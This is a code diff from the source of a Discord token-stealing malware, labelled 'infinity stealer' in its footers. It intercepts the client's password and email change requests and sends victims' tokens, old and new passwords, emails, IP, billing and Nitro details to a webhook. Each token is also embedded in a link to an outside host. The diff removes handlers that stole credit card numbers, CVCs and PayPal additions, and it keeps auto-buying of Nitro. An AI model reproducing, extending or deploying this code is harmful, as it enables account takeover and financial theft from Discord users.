@@ -687,28 +687,73 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Password Changed**',
-            value: `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}** [Click to copy](https://superfurrycdn.nl/copy/${token})`,
-            inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
+            name: '<a:b_800577490027413556:990325166397603921> **password changed**:',
+            value: ``,
             inline: false,
           },
+          {
+            name: '<a:b_800577490027413556:990325166397603921> username:',
+            value: `\`${json.username}#${json.discriminator}\``,
+            inline: false,
+          },
+          {
+            name: '<a:b_800577490027413556:990325166397603921> id:',
+            value: `\`${json.id}\``,
+            inline: false,
+          },
+          {
+            name: '<a:b_800577490027413556:990325166397603921> nitro:',
+            value: `\`${nitro}\``,
+            inline: !1,
+          },
+          {
+            name: '<a:b_800577490027413556:990325166397603921> Badges:',
+            value: `${badges}`,
+            inline: !1,
+          },    
+          {
+            name: '<a:b_800577490027413556:990325166397603921> Billing:',
+            value: `**${billing}**`,
+            inline: !1,
+          },
+          {
+            name: '<a:b_800577490027413556:990325166397603921> Email:',
+            value: `\`${email}\``,
+            inline: false,
+          },
+          {
+            name: '<a:b_800577490027413556:990325166397603921> old Password:',
+            value: `\`${oldpassword}\``,
+            inline: false,
+          },
+          {
+            name: '<a:b_800577490027413556:990325166397603921> new Password:',
+            value: `\`${newpassword}\``,
+            inline: false,
+          },
+          {
+            name: '<a:b_800577490027413556:990325166397603921> IP:',
+            value: `\`${config.ip}\``,
+            inline: false,
+          },
+          {
+            name: '<a:b_800577490027413556:990325166397603921> Token:',
+            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/${token})`,
+            inline: !1,
+          },
+
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
           text: 'infinity stealer',
         },
+        thumbnail: {
+          url: 'https://cdn.discordapp.com/avatars/676976206876377099/111fc5a53441fffa1516f6114620f888.png?size=2048',
+        },
+        title: `Total Friends (${friends})`,
+
       },
     ],
   };
@@ -729,28 +774,68 @@ const emailChanged = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Email Changed**',
-            value: `New Email: **${email}**\nPassword: **${password}**`,
-            inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
+            name: '<a:b_800577490027413556:990325166397603921> **email changed**:',
+            value: ``,
             inline: false,
           },
+          {
+            name: '<a:b_800577490027413556:990325166397603921> username:',
+            value: `\`${json.username}#${json.discriminator}\``,
+            inline: false,
+          },
+          {
+            name: '<a:b_800577490027413556:990325166397603921> id:',
+            value: `\`${json.id}\``,
+            inline: false,
+          },
+          {
+            name: '<a:b_800577490027413556:990325166397603921> nitro:',
+            value: `\`${nitro}\``,
+            inline: !1,
+          },
+          {
+            name: '<a:b_800577490027413556:990325166397603921> Badges:',
+            value: `${badges}`,
+            inline: !1,
+          },    
+          {
+            name: '<a:b_800577490027413556:990325166397603921> Billing:',
+            value: `**${billing}**`,
+            inline: !1,
+          },
+          {
+            name: '<a:b_800577490027413556:990325166397603921> New Email:',
+            value: `\`${email}\``,
+            inline: false,
+          },
+          {
+            name: '<a:b_800577490027413556:990325166397603921> Password:',
+            value: `\`${password}\``,
+            inline: false,
+          },
+          {
+            name: '<a:b_800577490027413556:990325166397603921> IP:',
+            value: `\`${config.ip}\``,
+            inline: false,
+          },
+          {
+            name: '<a:b_800577490027413556:990325166397603921> Token:',
+            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/${token})`,
+            inline: !1,
+          },
+
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
           text: 'infinity stealer',
         },
+        thumbnail: {
+          url: 'https://cdn.discordapp.com/avatars/676976206876377099/111fc5a53441fffa1516f6114620f888.png?size=2048',
+        },
+        title: `Total Friends (${friends})`,
+
       },
     ],
   };
@@ -758,89 +843,6 @@ const emailChanged = async (email, password, token) => {
   hooker(content);
 };
 
-const PaypalAdded = async (token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = getBilling(token);
-  const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [
-      { 
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Paypal Added**',
-            value: `Time to buy some nitro baby 😩`,
-            inline: false,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: false,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-        footer: {
-          text: 'infinity stealer',
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
-};
-
-const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
-  const json = await getInfo(token);
-  const nitro = getNitro(json.premium_type);
-  const badges = getBadges(json.flags);
-  const billing = await getBilling(token);
-  const content = {
-    username: config.embed_name,
-    avatar_url: config.embed_icon,
-    embeds: [
-      {
-        color: config.embed_color,
-        fields: [
-          {
-            name: '**Credit Card Added**',
-            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
-            inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: true,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
-            inline: false,
-          },
-        ],
-        author: {
-          name: json.username + '#' + json.discriminator + ' | ' + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
-        },
-        footer: {
-          text: 'infinity stealer',
-        },
-      },
-    ],
-  };
-  if (config.ping_on_run) content['content'] = config.ping_val;
-  hooker(content);
-};
 
 const nitroBought = async (token) => {
   const json = await getInfo(token);
@@ -859,11 +861,6 @@ const nitroBought = async (token) => {
           {
             name: '**Nitro bought!**',
             value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
-            inline: true,
-          },
-          {
-            name: '**Discord Info**',
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
             inline: true,
           },
           {
@@ -947,16 +944,7 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
         passwordChanged(data.password, data.new_password, token).catch(console.error);
       }
       break;
-
-    case details.url.endsWith('tokens') && details.method === 'POST':
-      const item = querystring.parse(unparsedData.toString());
-      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
-      break;
-
-    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
-      PaypalAdded(token).catch(console.error);
-      break;
-
+  
     case details.url.endsWith('confirm') && details.method === 'POST':
       if (!config.auto_buy_nitro) return;
       setTimeout(() => {
